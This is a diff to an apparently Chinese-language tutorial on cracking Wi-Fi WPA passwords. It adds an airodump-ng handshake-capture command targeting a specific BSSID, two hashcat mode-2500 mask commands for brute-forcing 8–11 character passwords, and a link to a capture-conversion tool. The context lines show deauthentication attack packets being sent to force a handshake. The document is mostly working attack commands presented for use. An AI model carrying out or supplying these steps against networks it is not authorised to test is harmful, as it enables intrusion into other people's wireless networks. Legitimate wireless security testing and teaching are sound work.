@@ -24,6 +24,9 @@
 
 `sudo airodump-ng --ivs -c 1 -w wifipass --bssid 80:8F:1D:83:42:76 wlan0mon`
 
+使用默认的cap包文件格式存档，后期转换待用
+`sudo airodump-ng -c 1 -w wifipass --bssid 80:8F:1D:83:42:76 wlan0mon`
+
 此窗口不要关，再开窗口发攻击包，观察这里的右上角，看有无出现 handshake ，出现则是包被抓到，未出现则继续增加攻击包。
 
 ### 4. 发攻击包（-0 发99个包，不够再加，赋值为0的话就是一直发）
@@ -53,6 +56,12 @@
     用 crunch 生成8位和9位的纯数字字典（第1个8为最少8位，第2个9为最多9位）
     
     `crunch 8 9 0123456789 -o dict.txt`
+
+    `hashcat --hash-type 2500 --attack-mode 3 bb.hccapx --increment --increment-min 8 --increment-max 11 --custom-charset1 '?l?d' '?1?1?1?1?1?1?1?1?1?1?1'`
+
+    `hashcat --hash-type 2500 --attack-mode 3 bb.hccapx --increment --increment-min 8 --increment-max 11 '?d?d?d?d?d?d?d?d?d?d?d'`
+
+    https://hashcat.net/cap2hccapx/
 
 ### 6. 退出监听模式
 `sudo airmon-ng stop wlan0mon`
